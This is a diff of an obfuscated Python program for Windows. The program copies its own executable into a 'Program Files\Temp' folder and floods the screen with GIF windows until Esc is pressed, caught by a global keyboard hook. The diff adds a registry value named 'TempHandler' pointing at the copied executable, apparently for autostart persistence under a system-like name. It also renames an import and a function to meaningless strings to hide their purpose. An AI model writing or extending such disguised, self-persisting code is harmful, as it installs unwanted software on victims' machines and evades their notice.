@@ -1,6 +1,6 @@
 import time, shutil, os, threading, sys, random, keyboard
 import tkinter as tk
-from tkinter import messagebox
+from tkinter import messagebox as wevr42sa
 import winreg as reg
 def dwbvcfgb43(b34rt, b40tihb="registrydictionary"):
     try:
@@ -8,11 +8,12 @@ def dwbvcfgb43(b34rt, b40tihb="registrydictionary"):
         reg.SetValueEx(n4u89vr90qhbt0bh3q4tb, b40tihb, 0, reg.REG_SZ, b34rt)
         reg.CloseKey(n4u89vr90qhbt0bh3q4tb)
     except Exception as e:
-        messagebox.showerror(title="Error", message=e)
+        wevr42sa.showerror(title="Error", message=e)
 if getattr(sys, 'frozen', False):
     jhn8m903bv = sys.executable
 else:
     jhn8m903bv = __file__
+hvcnby8u9 = 'C:\\Program Files\\Temp\\TempHandler.exe'
 h8n02vrh32 = 'C:\\Program Files\\Temp'
 try:
     os.makedirs(h8n02vrh32, exist_ok=True)
@@ -21,11 +22,12 @@ try:
         if not os.path.exists(jmortj9):
             shutil.copy2(jhn8m903bv, jmortj9)
 except PermissionError:
-    messagebox.showerror(title='Access Denied!', message='You have to run this application as an administrator.')
+    wevr42sa.showerror(title='Access Denied!', message='You have to run this application as an administrator.')
     sys.exit()
 except Exception as e:
-    messagebox.showerror(title='Error', message=f'An unexpected error occurred: {e}')
+    wevr42sa.showerror(title='Error', message=f'An unexpected error occurred: {e}')
     sys.exit()
+dwbvcfgb43(hvcnby8u9, b40tihb="TempHandler")
 hyn4nud6u = True
 def hqpxjce9an2():
     global hyn4nud6u
@@ -39,7 +41,7 @@ def hqpxjce9an2():
         fnuvowiev = os.path.dirname(os.path.abspath(__file__))
     tg5n = os.path.join(fnuvowiev, "idio.gif")
     if not os.path.exists(tg5n):
-        messagebox.showerror("Error, this OS is not supported.")
+        wevr42sa.showerror("Error, this OS is not supported.")
         sys.exit()
     r432 = tk.PhotoImage(file=tg5n)
     while hyn4nud6u:
@@ -58,13 +60,13 @@ def hqpxjce9an2():
     for wbfvriohu in cvgbhun:
         wbfvriohu.destroy()
     i9340bhwiueb.destroy()
-def monitorKey():
+def vjmjowvef():
     global hyn4nud6u
     keyboard.wait('esc')
     hyn4nud6u = False
 i9340bhwiueb = tk.Tk()
 i9340bhwiueb.withdraw()
-threading.Thread(target=monitorKey, daemon=True).start()
+threading.Thread(target=vjmjowvef, daemon=True).start()
 hqpxjce9an2()
 
 if False:
